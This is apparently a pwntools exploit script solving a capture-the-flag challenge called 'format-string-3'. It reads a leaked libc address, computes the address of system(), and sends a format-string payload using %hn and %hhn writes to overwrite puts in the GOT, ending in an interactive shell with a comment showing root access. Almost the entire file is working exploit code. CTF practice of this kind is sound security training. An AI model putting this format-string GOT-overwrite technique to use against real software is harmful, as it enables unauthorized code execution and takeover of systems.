#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template format-string-3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'format-string-3')

################################################
# HI LOOK AT ME I MAKE IT WORK ON OSX - JUSTIN #
################################################
libc = ELF('./libc.so.6')


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = libc
else:
    library_path = libcdb.download_libraries('libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = libc
    else:
        libc = ELF('libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.HOST and args.PORT:
        return remote(args.HOST, args.PORT)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x3ff000)
# RUNPATH:    b'.'
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

# PIE is disabled
# GOT is writable
# They give us a libc leak
# Seems like the plan here is calculate system() or execve() 
# and then crud up puts so that puts(normal_string) turns into system(/bin/bash)

PUTS_GOT_ADDR = 0x404018

io = start()

io.info("PIE is disabled w/ writable GOT - puts@got = 0x%08x" % PUTS_GOT_ADDR)
io.readuntil(b"setvbuf in libc: ")
setvbuf_addr = int(io.readline().strip().decode('latin1'), 16)
io.info("setvbuf addr = 0x%08x" % setvbuf_addr)
libc_base = setvbuf_addr - libc.symbols['setvbuf']
io.info("libc_base = 0x%08x" % libc_base)
system_addr = libc_base + libc.symbols['system']
io.info("system_addr = 0x%08x" % system_addr)

# buf is @ 38th qword from start
#io.sendline(b"AAAAAAAA" + b"%38$p")
io.info("buf is @ 38th qword from start...")

# extract the bytes we need to write
system_bottom_word = system_addr & 0xFFFF
system_next_byte = (system_addr & 0xFF0000) >> 16
# calculate distance to wrap
system_next_byte_write = system_next_byte - (system_bottom_word & 0xFF) + 0x100

# building payload....
payload  = f"%0{system_bottom_word}x".encode('latin1')
payload += f"%42$hn".encode('latin1')
payload += f"%0{system_next_byte_write}x".encode('latin1')
payload += f"%43$hhn".encode('latin1')
payload += b'.' * (8 - (len(payload) % 8))
payload += p64(PUTS_GOT_ADDR)
payload += p64(PUTS_GOT_ADDR + 2)

io.info("built payload: " + payload.decode('latin1'))
io.info("sending payload...")

#pause()
io.sendline(payload)

io.clean()
io.success("here's your shell!")
io.interactive()

# $ whoami
# root

